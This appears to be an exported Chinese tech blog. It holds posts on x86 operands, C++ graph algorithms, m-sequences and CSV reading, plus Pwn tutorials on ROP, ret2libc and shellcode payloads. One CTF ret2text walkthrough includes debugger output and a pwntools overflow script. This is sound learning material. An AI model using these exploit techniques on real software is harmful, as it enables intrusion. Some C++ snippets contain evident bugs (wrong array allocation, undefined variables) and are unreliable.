4.**操作数指示符大多数指令有一个或多个操作数，指示出执行一个操作要使用的原数据的值，以及放置结果的目的位置；。x86-64支持多种操作数格式，源数据值可以以常数形式给出，或是从寄存器或内存中读出。结果可以存放字寄存器或内存中。因此，各种不同的操作数的可能性被分为三种类型。 第一种类型是立即数，用来表示常数值，在ATT格式的汇编代码中，立即数的书写格式$后面跟一个标准C表示法表示的整数。不同指令允许的立即数值放了为不同，汇编器会自动选择最紧凑的方式进行数值编码。 第二种类型是寄存器，它表示某个寄存器的内容，16个寄存器的低位1字节、2字节、4字节或8字节中的一个作为操作数，这些字节数分别对应于8位、16位、32位或64位。在下图中，用符号ra来表示任意寄存器a，用引用R[ra]来表示它的值，这是将寄存器集合看成一个数组R，用寄存器标识符作为索引。 第三种类型是内存引用，它会根据计算出来的地址访问某个内存地址。因为将内存看成一个很大的字节数组，我们用符号Mb[Addr]表示对存储在内存中从地址Addr开始的b个字节值的引用。 如下表所示，不同形式的寻址模式，允许不同形式的内存引用。 其中要区分Imm(a,b,c)和Imm(a,b)。 有两个逗号的应该b*c+a+Imm，一个逗号就直接就b+a+Imm，只有寄存器单独存在，不加任何括号时，则代表里面存的是实际的值，否则都是需要指向内存的值（地址）。 图中比例因子s必须为1,2,4,8 5.数据传送指令","categories":[{"name":"深入理解计算机系统","slug":"深入理解计算机系统","permalink":"http://example.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"计算机系统","slug":"计算机系统","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"}]},{"title":"数据结构-图的遍历","slug":"数据结构/数据结构-图的遍历","date":"2020-11-17T10:50:45.000Z","updated":"2020-11-18T08:02:54.000Z","comments":true,"path":"2020/11/17/数据结构/数据结构-图的遍历/","link":"","permalink":"http://example.com/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/","excerpt":"","text":"1.深度优先搜索1.定义图的类型 其中matrix为一个二维指针，存一个二维数组用于临接矩阵，vex为int的一个一维数组，用于存顶点信息。 vexnum为顶点的个数，arcnum为弧的个数 123456789101112131415161718192021class MGraph&#123; public:int **matrix; public:int *vex; //顶点数以及弧边数 public:int vexnum,arcnum; MGraph(int vexnum,int arcnum)&#123; this-&gt;vexnum=vexnum; this-&gt;arcnum=arcnum; matrix=new int*[vexnum]; for(int i=0;i&lt;vexnum;i++)&#123; matrix[i]=new int(vexnum); for(int j=0;j&lt;vexnum;j++)&#123; matrix[i][j]=0; &#125; &#125; vex=new int(vexnum); for(int i=0;i&lt;vexnum;i++) vex[i]=i; &#125;&#125;; 2.深度优先搜索递归函数 12345678910void DFS(MGraph *mgraph,int v)&#123; matrix_all_bool[v]=true; //访问节点函数 visitVex(mgraph,v); for(int w=FirstAdjVex(mgraph,v);w&gt;=0;w=NextAdjVex(mgraph,v,w))&#123; if(!matrix_all_bool[w])&#123; DFS(mgraph,w); &#125; &#125;&#125; 其中v为访问元素的位置，即进入该函数比该位置没被访问，然后用一个for循环去遍历该函数的临接节点，如果该临接节点没被访问，则递归调用该函数。 FistAdjVex(mgraph,v) 该函数找出v节点的从小到大的第一个临接节点 12345678910int FirstAdjVex(MGraph *mgraph,int v)&#123; //查与数组下标为v的顶点之间有有边的顶点，返回它在数组中的下标 for(int i=0;i&lt;mgraph-&gt;vexnum;i++) &#123; if(mgraph-&gt;matrix[v][i])&#123; return i; &#125; &#125; return -1;&#125; NextAdjVex(mgraph,v) 该函数是找按从小到大的顺序找下一个临接节点 12345678int NextAdjVex(MGraph *mgraph,int v,int w)&#123; for(int i=w+1;i&lt;mgraph-&gt;vexnum;i++)&#123; if(mgraph-&gt;matrix[v][i])&#123; return i; &#125; &#125; return -1;&#125; w变量，如果能找到临接节点代表的是数组下标，也就是顶点的值，如果循环一次找不到节点则输出的是-1。 入口函数 1234567void DFSTraverse(MGraph *mgraph)&#123; for(int i=0;i&lt;mgraph-&gt;vexnum;i++)&#123; if(!matrix_all_bool[i])&#123; DFS(mgraph,i); &#125; &#125;&#125; 2.广度优先搜索1.广度优先搜索函数 12345678910111213141516171819202122232425void BFSTraverse(MGraph *mgraph)&#123; for(int i=0;i&lt;mgraph-&gt;vexnum;i++) matrix_all_bool[i]=false; Queue* queue=new Queue; queue-&gt;next=nullptr; for(int i=0;i&lt;mgraph-&gt;vexnum;i++)&#123; if(!matrix_all_bool[i])&#123; matrix_all_bool[i]=true; visitVex(mgraph,i); Enqueue(queue,i); while(!isemqueue(queue))&#123; //出队的元素 int point_num; Dequeue(queue,point_num); for(int j=FirstAdjVex(mgraph,point_num);j&gt;=0;j=NextAdjVex(mgraph,point_num,j))&#123; if(!matrix_all_bool[j])&#123; matrix_all_bool[j]=true; visitVex(mgraph,j); Enqueue(queue,j); &#125; &#125; &#125; &#125; &#125;&#125; 其中比较主要是的一个入队以及出队的操作，首先遇到一个节点，判断该节点是否已经遍历过。若没遍历过，先将该节点入队，然后访问该节点，剩下来判断队列是否为空，若不为空进入循环，并且出队拿到该节点的数据，利用该节点的数据去遍历临接矩阵，将于该节点相临的所有节点全都入队。 2.队列操作代码 1234567891011121314151617181920212223242526//入队void Enqueue(Queue *queue,int point)&#123; Queue *temp=new Queue; temp-&gt;num_point=point; temp-&gt;next=nullptr; //循环队列指针 Queue *temp_point=queue; while(temp_point-&gt;next!=nullptr)&#123; temp_point=temp_point-&gt;next; &#125; temp_point-&gt;next=temp;&#125;//出队void Dequeue(Queue *queue,int &amp;point)&#123; point=queue-&gt;next-&gt;num_point; queue-&gt;next=queue-&gt;next-&gt;next;&#125;//判断队列是否为空bool isemqueue(Queue *queue)&#123; if(queue-&gt;next==nullptr)&#123; return true; &#125; return false;&#125; 3.遍历的测试数据 0 1 28 0 5 10 1 2 16 1 6 14 2 3 12 3 4 22 3 6 18 4 5 25 4 6 24 4.最小生成树 克鲁斯卡尔算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//最小生成树的算法 克鲁斯卡尔(Kruskal)算法int Find(int *parent,int f)&#123; while(parent[f]&gt;0)&#123; f=parent[f]; &#125; return f;&#125;void MinSpanTree_Kruskal(MGraph *mgraph)&#123; Edges edges[mgraph-&gt;arcnum]; int k=0; for(int i=0;i&lt;mgraph-&gt;vexnum;i++)&#123; for(int j=i;j&lt;mgraph-&gt;vexnum;j++)&#123; if(mgraph-&gt;matrix[i][j]!=0&amp;&amp;mgraph-&gt;matrix[i][j]&lt;999)&#123; edges[k].begin=i;edges[k].end=j;edges[k].weight=mgraph-&gt;matrix[i][j]; k++; &#125; &#125; &#125; //冒泡排序 for(int i=0;i&lt;mgraph-&gt;arcnum;i++)&#123; for (int j = i; j &lt; mgraph-&gt;arcnum-1; j++) &#123; if(edges[i].weight&gt;edges[j+1].weight)&#123; Edges temp=edges[i]; edges[i]=edges[j+1]; edges[j+1]=temp; &#125; &#125; &#125; // for(int i=0;i&lt;mgraph-&gt;arcnum;i++)&#123; // cout&lt;&lt;edges[i].begin&lt;&lt;&quot; &quot;&lt;&lt;edges[i].end&lt;&lt;&quot; &quot;&lt;&lt;edges[i].weight&lt;&lt;endl; // &#125; int parent[mgraph-&gt;vexnum]; for(int i=0;i&lt;mgraph-&gt;vexnum;i++)&#123; parent[i]=0; &#125; int n,m; for(int i=0;i&lt;mgraph-&gt;arcnum;i++)&#123; n=Find(parent,edges[i].begin); m=Find(parent,edges[i].end); if(n!=m)&#123; parent[n]=m; cout&lt;&lt;&quot;(&quot;&lt;&lt;edges[i].begin&lt;&lt;&quot; &quot;&lt;&lt;edges[i].end&lt;&lt;&quot;)&quot;&lt;&lt;edges[i].weight&lt;&lt;endl; &#125; &#125;&#125; 其中比较重要的是一个辅助数组，辅助数组可以找出两个节点是否为非连通图。 测试数据 0 5 102 3 121 6 141 2 163 6 183 4 224 6 244 5 250 1 28 其中parent输出的数组为 一开始parent数组全为0但，按照顺序 (0,5)可以被融入集合，此时parent[0]=5,即两点有被连接······而到了(3,6)根据算法 1234567//最小生成树的算法 克鲁斯卡尔(Kruskal)算法int Find(int *parent,int f)&#123; while(parent[f]&gt;0)&#123; f=parent[f]; &#125; return f;&#125; 当parent[f]&gt;0则代表有连通，则一直去寻找他的父节点，当(3,6)的时候此时的parent数组应为可以看到此时begin为3则直接输出3，因为它已经属于父节点，而end为6时，找到了parent[6]为3，可以看到两者的父节点相同，证明两者已经在同一个集合里面。 运行截图： 5.最小生成树 普里姆算法算法简述：从零点开始，将临接矩阵的值不断并入集合lowcast，通过遍历完全部临接矩阵的值然后最后找出最小边。 流程：假设此时的数据为 可以看到零点到所有顶点的值为[0,28,999,999,999,10,999]找出最小值为10，该点为6，所以(0,6);接下来将第6行的值也并入集合，此时lowcast的值为[0,28,999,999,25,0,999]可以看到已经有一个999被替换成999，并且adjvex中就是连接的点。 adjvex中存的是lowcast中lowcast下标顶点到adjvex中值的距离 假设lowcast为[0,0,34,16,12];adjvex为[0,0,1,3,4]那么其中的34代表顶点1到2的距离为34 123456789101112131415161718192021222324252627282930313233343536373839//最小生成树的算法 普里姆算法void Minitree_prim(MGraph *mgraph)&#123; //min是当前的最小值，k是当前最小值的下标 int min,k,j; int lowcoast[mgraph-&gt;vexnum]; int adjvex[mgraph-&gt;vexnum]; lowcoast[0]=0; adjvex[0]=0; //先将第一个节点临接节点的值赋值给该数组 for(int i=1;i&lt;mgraph-&gt;vexnum;i++)&#123; lowcoast[i]=mgraph-&gt;matrix[0][i]; adjvex[i]=0; &#125; //从第一个节点开始，从lowcast中找出最小值 for(int i=1;i&lt;mgraph-&gt;vexnum;i++)&#123; min=MAX; j=0;k=0; //遍历出lowcast中的最小值 k为其下标 for(;j&lt;mgraph-&gt;vexnum;j++)&#123; if(lowcoast[j]!=0&amp;&amp;lowcoast[j]&lt;min)&#123; min=lowcoast[j]; k=j; &#125; &#125; //adjvex中存的是lowcast中lowcast下标顶点到adjvex中值的距离 //假设lowcast为[0,0,34,16,12];adjvex为[0,0,1,3,4]那么其中的34代表顶点1到2的距离为34 cout&lt;&lt;&quot;(&quot;&lt;&lt;adjvex[k]&lt;&lt;&quot;,&quot;&lt;&lt;k&lt;&lt;&quot;)&quot;&lt;&lt;endl; lowcoast[k]=0; for(j=1;j&lt;mgraph-&gt;vexnum;j++)&#123; if(lowcoast[j]!=0&amp;&amp;mgraph-&gt;matrix[k][j]&lt;lowcoast[j])&#123; lowcoast[j]=mgraph-&gt;matrix[k][j]; adjvex[j]=k; &#125; &#125; &#125;&#125; 6.最小路径算法 迪杰斯特拉算法算法简述：首先是S_bool数组是判断有没有被纳入集合，已经纳入集合代表着是已经存在是最短路径了。 D数组是路径大小的集合，Path数组则是记录数组下标节点的前驱节点。 第一次循环对于D数组中找到的最小值必定是可以纳入集合，假设找到的节点为5，那么就将(0,5)看成一个整体，然后判断是否需要更新D的值，如果数组的D[5]+matrix中(i,5)的距离小于D[i]，则需要更新该节点的值为D[5]+matrix中的值，并且将Path[i]的前驱节点改为5 12345678910111213141516171819202122232425262728293031323334353637383940//最小路径算法 迪杰斯特拉算法void ShortestPath_DIJ(MGraph* mGraph,int v0)&#123; //判断点是否已经纳入集合 bool S_bool[mGraph-&gt;vexnum]; int D[mGraph-&gt;vexnum]; //前驱节点 int Path[mGraph-&gt;vexnum]; for(int i=0;i&lt;mGraph-&gt;vexnum;i++)&#123; S_bool[i]=false; D[i]=mGraph-&gt;matrix[v0][i]; //v0跟v之间有弧，则将v的前驱置为v0;无弧则将v的前置置为-1 if(D[i]&lt;999) Path[i]=v0; else Path[i]=-1; &#125; S_bool[v0]=true; D[v0]=0; int v,min; //主算法 for(int i=1;i&lt;mGraph-&gt;vexnum;i++)&#123; min=999; //找出最小的边 然后记录下顶点以及min的值 for(int w=0;w&lt;mGraph-&gt;vexnum;w++)&#123; if(!S_bool[w]&amp;&amp;D[w]&lt;min)&#123; v=w;min=D[w]; &#125; &#125; S_bool[v]=true; for(int w=0;w&lt;mGraph-&gt;vexnum;w++)&#123; if(!S_bool[w]&amp;&amp;(D[v]+mGraph-&gt;matrix[v][w]&lt;D[w]))&#123; D[w]=D[v]+mGraph-&gt;matrix[v][w]; Path[w]=v; &#125; &#125; &#125; for(int i=0;i&lt;mGraph-&gt;vexnum;i++)&#123; cout&lt;&lt;D[i]&lt;&lt;&quot; &quot;; &#125;&#125; 运行完成后此时的Path 可以看到0-1:28 0-1-2:44 0-1-2-3:56 0-5:10 0-5-4:35 0-1-6:42","categories":[],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"密码学-m序列产生原理及其性质","slug":"密码学/密码学-m序列产生原理及其性质","date":"2020-11-14T05:54:14.000Z","updated":"2021-04-01T12:39:18.000Z","comments":true,"path":"2020/11/14/密码学/密码学-m序列产生原理及其性质/","link":"","permalink":"http://example.com/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/","excerpt":"","text":"m序列的简介1、m序列是最长线性移位寄存器序列的简称。顾名思义，m序列是由多级移位寄存器或其延迟元件通过线性反馈产生的最长的码序列。在二进制移位寄存器中，若n为移位寄存器的级数，n级移位寄存器共有 2n 个状态，除去全0状态外还剩下 2n-1 中状态，因此它能产生的最大长度的码序列为 2n-1 位，也就是说，一个n级线性反馈移位寄存器产生的最长周期等于 2n-1 。在码分多址系统中主要采用两种长度的m序列：一种是周期为 215-1的m序列，又称短PN序列；另一种是周期为242-1的m序列，又称为长PN码序列。 2、m序列是一种基本又典型的伪随机序列。在通信领域有着广泛的应用，如扩频通信、卫星通信的码分多址（CDMA），数字数据中的加密、加扰、同步、误码率测量等领域。 m序列的产生原理图(1)示出的是由n级移位寄存器构成的码序列发生器。寄存器的状态决定于时钟控制下输入的信息（“0”或“1”），例如第I级移位寄存器状态决定于前一时钟脉冲后的第i－1级移位寄存器的状态。图中C0，C1，…，Cn均为反馈线，其中C0＝C1＝1，表示反馈连接。因为m序列是由循环序列发生器产生的，因此C0和Cn肯定为1，即参与反馈。而反馈系数C1，C2，…，Cn－1，若为1，参与反馈；若为0，则表示断开反馈线，即开路，无反馈连线。 一个线性反馈移动寄存器能否产生m序列，决定于它的反馈系数Ci ( i=0,1,2,…n) ，下表中列出了部分m序列的反馈系数 ，按照下表中的系数来构造移位寄存器，就能产生相应的m序列。 选择合适的反馈函数可使序列的周期达到最大值2的n次方-1，周期达到最大值的序列称为m序列 根据表1中的八进制的反馈系数，可以确定m序列发生器的结构。以7级m序列反馈系数Ci=(211)8为例，首先将八进制的系数转化为二进制的系数即Ci=(010001001)2，由此我们可以得到各级反馈系数分别为：C0=1，C1=0，C2=0，C3=0，C4=1，C5=0，C6=0，C7=1，由此就很容易地构造出相应的m序列发生器。根据反馈系数，其他级数的m序列的构造原理与上述方法相同。 m序列的产生和本原多项式由n级串联的移位寄存器和反馈逻辑线路可组成动态移位寄存器，如果反馈逻辑线路只由模2和构成，则称为线性反馈移位寄存器。带线性反馈逻辑的移位寄存器设定初始状态后，在时钟触发下，每次移位后各级寄存器会发生变化，其中任何一级寄存器的输出，随着时钟节拍的推移都会产生一个序列，该序列称为移位寄存器序列。n级线性移位寄存器如下图所示： 生成函数的性质 m序列的伪随机性 m序列的安全性","categories":[{"name":"密码学","slug":"密码学","permalink":"http://example.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[]},{"title":"c++文件流的读写","slug":"C、C++/c++文件流的读写","date":"2020-11-07T03:37:03.000Z","updated":"2021-04-01T13:56:06.000Z","comments":true,"path":"2020/11/07/C、C++/c++文件流的读写/","link":"","permalink":"http://example.com/2020/11/07/C%E3%80%81C++/c++%E6%96%87%E4%BB%B6%E6%B5%81%E7%9A%84%E8%AF%BB%E5%86%99/","excerpt":"","text":"从csv文件读入小数源码： 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;fstream&gt;#include&lt;sstream&gt;#include&lt;vector&gt;int main()&#123; fstream r_in; r_in.open(&quot;matrix_r.csv&quot;,ios::in); if(!r_in)&#123; cout&lt;&lt;&quot;打开matrix_r.csv文件出错&quot;&lt;&lt;endl; &#125; string s; vector&lt;vector&lt;string&gt;&gt; strarry; int r_count=0; while (getline(in,s)) &#123; stringstream ss(s); string str; vector&lt;string&gt; linearry; while(getline(ss,str,&#x27;,&#x27;)) &#123; linearry.push_back(str); &#125; r_count++; strarry.push_back(linearry); &#125; for(int i=0;i&lt;row;i++)&#123; for(int j=0;j&lt;cow;j++)&#123; cout&lt;&lt;stringToNum&lt;float&gt;(strarry[i][j])&lt;&lt;&quot; &quot;; &#125; cout&lt;&lt;endl; &#125; &#125;","categories":[],"tags":[{"name":"C、C++","slug":"C、C","permalink":"http://example.com/tags/C%E3%80%81C/"}]},{"title":"Pwn-程序内存布局","slug":"Pwn/Pwn-程序内存布局","date":"2020-10-30T11:26:51.000Z","updated":"2021-04-01T14:04:46.000Z","comments":true,"path":"2020/10/30/Pwn/Pwn-程序内存布局/","link":"","permalink":"http://example.com/2020/10/30/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/","excerpt":"","text":"程序启动时，加载器会将程序文件数据加载到内存里，在运行过程中，程序也会开辟部分动态内存。在程序运行的生命周期中，内存中比较重要的四部分数据是程序数据、堆、库数据、栈。另外，内核空间也会映射到程序内存中。 程序数据一般映射在内存的较低地址处，然后依次为堆数据、库数据及栈等，其中还映射一部分起保护作用的不可访问区域 Proc程序数据代码段、数据段、BSS段程序数据主要包含三部分，其中代码段（Text段）主要用来存放可执行文件的代码指令，是可执行程序在内存中的镜像，代码段一般是只读的；数据段则用来存放可执行文件中已经初始化的变量，包含静态分配的变量和全局变量等；BSS段主要函数程序中未初始化的全局变量，在内存中BSS段全部 Heap堆堆主要用于存放进程运行过程中动态申请的内存段。进程调用malloc、alloca、new等函数来申请内存，利用free、delete等函数释放内存。这部分的大小不固定，以方便程序灵活使用内存。 Memory Mapping库数据这部分数据很多是映射的系统库文件，其中比较重要的是libc库，很多程序所使用的系统函数都会动态地链接到libc库中去。 Stack栈栈存放程序临时创建的局部变量，包括函数内部的临时变量和调用函数时压入的参数。由于栈具有后进先出的特点，因此可以很方便地用来保存和恢复函数调用现场。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Pwn-常见利用方法","slug":"Pwn/Pwn-常见利用方法","date":"2020-10-30T11:01:30.000Z","updated":"2021-04-01T14:04:06.000Z","comments":true,"path":"2020/10/30/Pwn/Pwn-常见利用方法/","link":"","permalink":"http://example.com/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/","excerpt":"","text":"Shellcode 一般指获取shell代码，针对数据未开启可执行保护NX，可以将shellcode直接布置在堆栈等可写可执行区域保护NX，可以将shellcode直接布置在堆栈等可写可执行区域，然后劫持控制流，跳转过去即可。另外，可以通过其他手段如（rop）将数据区的NX关闭（mprotect设置页属性），或者将代码部分的也属性设置为可写，并在这里布置shellcode，然后执行shellcode。 payload: padding1+address of shellcode +padding2+shellcoede address of shellcode是后面shellcode起始处的地址，用来覆盖返回地址。 shellcode应该为十六进制的机器码的格式 shellcode起始地址：在padding2里填充若干长度的“\\x90”，这个机器码对应的指令是NOP，也就是告诉CPU什么也不做，然后跳到吓一跳指令，有了这一段NOP的填充，只要返回地址能够命中这一段的任意位置，都可以副作用跳到shellcode，这种方法被成为“NOP Sled” 这个方法的前提是系统关闭了NX以及 rop(Return Oriented Programming)修改放回地址，让其指向内存中已有的一段指令 rop即放回地址导向编程，通常是利用动态链接库和可执行文件中可利用指令片段（gadget），这些指令片段均以ret指令结尾，即用ret指令可以实现指令片段执行流的衔接，一般针对程序开启了NX属性，但可以控制栈上数据的情况，利用栈结构中的返回地址可以实现控制流的构造。 执行完gadget1，通过ret返回，进入gadget2，从而使得所有的gadget得到有序执行，为了简化rop实现，很多时候有很多libc库函数可以直接利用，从而出现了ret2libc。 其中，func_ptr是一些要调用的函数的地址，而arg1、arg2等等则是该函数所需要的参数，p_ret是游一些pop ret的gadget地址，gadget的形式如pop eax、pop ebx、ret。pop的个数和参数保持一致。rop的原理和函数栈的实现机制有关，其他架构系统可根据函数调用的传递规则来具体构造。 ROP常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是int 0x80，执行这条指令时，被调用函数的编号存入eax，调用参数应按顺序存入ebx，ecx，edx，esi，edi中。 例如：编号125对应函数mprotect（void &amp;addr,size_t len,int prot），可用该函数将栈的属性改为可执行，这样就可以使用shellcode了。假如利用系统调用执行这个函数，eax、ebx，ecx、edx应该分别为“125“、内存栈的分段地址（可以通过调试工具确定）、**”0x10000“(需要修改的空间长度，也许需要更长)、”7“(RWX权限)**。 对于上面提到的mprotect函数，我们需要将参数传输到寄存器，所以可以用pop指令将栈顶数据弹如寄存器，如果在内存中能找到直接可用的数据，也可以用mov指令进行传输，不过写入数据再pop要比mov来的简单，如果要用pop指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。 Magic_AddrMagic_Addr是指专门通过一个地址获取shell的地址，一般位于system函数的实现代码中的one_gadget。在libc的system函数中，有多出调用了execve(“/bin/sh”,”sh”,ebv)函数对应的反编译代码和反汇编代码。 Return-to-dl_resolve核心思想是利用_dl_runtime_resolve函数解析出system函数的地址，通常能够在没有提供libc库情况看下使用。 其适用情况需要满足如下三个条件。 1.未给出libc库。 2.没有开启PIE保护，如果开启了PIE保护，则还需要通过泄露获取基地址。 3.没有开启FULL RELRO。 Return2libc修改返回地址，让其指向内存中已有的某个函数 要完成的任务包括：在内存中确定某个函数的地址，覆盖掉返回地址，由于libc动态链接库中的函数被广泛应用，所以有很大概率在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如system()等），所以通常使用这些系统级函数来获得当前进程的控制权，鉴于要执行函数可能需要参数，比如调用system( )函数打开shell的完整形式为system(&quot;/bin/sh&quot;)，所以溢出数据也要包括必要的参数 。 payload：padding1+address of system() +padding2+ address of “/bin/sh” padding1处的数据可以随意填充（注意不要包含”\\x00“，否则程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system( )时system( )在内存中的地址，用来覆盖返回地址。padding2处的数据长度为4对于32位机器来说，对应调用system( )返回地址，在这里只需要打开shell，不关心从shell退出之后的行为，所以padding2的内容可以随意填充。address of “/bin/sh”是字符串”/bin/sh”在内存中的地址，作为传给syste( )的参数。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Pwn-基础ROP","slug":"Pwn/Pwn-基础ROP","date":"2020-10-18T11:40:07.000Z","updated":"2021-04-01T14:05:06.000Z","comments":true,"path":"2020/10/18/Pwn/Pwn-基础ROP/","link":"","permalink":"http://example.com/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/","excerpt":"基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。 rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来弹出后续的args，成为rop形式 对于x64程序来说，一般情况下， 函数的参数较少，通常主要是利用寄存器来传递参数，所以在进入函数之前，应先将寄存器设置好，对于理解rop也比较容易","text":"基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。 rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来弹出后续的args，成为rop形式 对于x64程序来说，一般情况下， 函数的参数较少，通常主要是利用寄存器来传递参数，所以在进入函数之前，应先将寄存器设置好，对于理解rop也比较容易 ret2text1.ret2text控制程序执行程序本身已有的代码（.text）。这种攻击方法是一种笼统描述，我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是所说的ROP checksec 其中没有开启栈溢出保护，这样就可以通过覆盖到返回地址执行程序 在main函数的伪代码中可以看到有个gets函数，参数s作为gets参数，s参数距离栈顶指针esp+1Ch，距离栈底指针ebp-64h，这里规定可以承载字符串的数量 2.溢出过程 需要考虑可控内存的起始地址距离main函数的返回地址的距离 1.在ida查看main函数的汇编代码，看到gets函数的地址 12345.text:0804869B mov dword ptr [esp], offset s ; &quot;There is something amazing here, do you&quot;....text:080486A2 call _puts.text:080486A7 lea eax, [esp+80h+s].text:080486AB mov [esp], eax ; s.text:080486AE call _gets 可以看到gets函数的地址为0x080486AE 在main接收字符串是通过相对esp进行索引的，所以需要使用到gdb查看一下索引时的esp和ebp位置。所以在call处下断点（0x080486AE），程序停在call的初始位置，字符串刚刚进栈，此时寄存器中显示的就是字符串的esp和ebp 12345678910111213141516171819pwndbg&gt; b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.pwndbg&gt; rStarting program: /home/hollk/ctf-challenges/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text There is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf);LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────[ REGISTERS ]─────────────────────────────── EAX 0xffffd05c —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34 EBX 0x0 ECX 0xf7fb5dc7 (_IO_2_1_stdout_+71) ◂— 0xfb68900a EDX 0xf7fb6890 (_IO_stdfile_1_lock) ◂— 0x0 EDI 0x0 ESI 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c EBP 0xffffd0c8 ◂— 0x0 ESP 0xffffd040 —▸ 0xffffd05c —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34 EIP 0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8 esp的位置为0xffffd040，ebp的位置为 0xffffd0c8,由于s相对与esp的索引为[esp+0x1c] 0xffffd040 + 0x1c = 0xffffd05c，即可得到s的地址为0xffffd05c，那么s相对于ebp的偏移量为 0xffffd0c8 - 0xffffd05c = 0x6c，最后再加上ebp保存的值，即是0x6c+4即可覆盖到ret 12345678910111213##coding=utf8#from pwn import *from pwn import *## 构造与程序交互的对象sh = process(&#x27;./ret2text&#x27;)success_addr = 0x0804863A## 构造payloadpayload = &#x27;a&#x27; * 0x6c+&#x27;bbbb&#x27;+ p32(success_addr)#print p32(success_addr)## 向程序发送字符串sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive() 2.直接爆破，通过cyclic工具创建200个字符串 12$ cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab 在gdb运行输入可以看到中断的地址 可以看到0x62616164中断，gdb报错停止在0x62616164位置，可以用cyclic查看停止处字符串长度 12$ cyclic -l 0x62616164112 得到112，这个数字就是从输入内存可控起始地址到ret地址 ret2shellcode先checksec 没有开启栈不可行保护 在IDA中可以看到该函数有gets函数，可以直接通过该函数覆盖到返回地址 函数列表没有可以直接跳转的shellcode函数 由于主函数可以有把输入的字符串赋值到buf2，而buf2是一个全局变量，看该所在的bss段是否可以执行 先在IDA中找到该bss段的地址 12345.bss:0804A080 public buf2.bss:0804A080 ; char buf2[100].bss:0804A080 buf2 db 64h dup(?) ; DATA XREF: main+7B↑o.bss:0804A080 _bss ends.bss:0804A080 gdb中可以看到 可以看到该bss段是可执行的，现在的思路是把shellcode写到bss段，再将主函数的返回地址跳转到该bss段的地址，由于main函数的s是对esp有索引，所以需要去动态调试，现在IDA查看gets函数的地址，然后在gdb中设置该断点，查看此时的esp地址 1234.text:08048587 call _puts.text:0804858C lea eax, 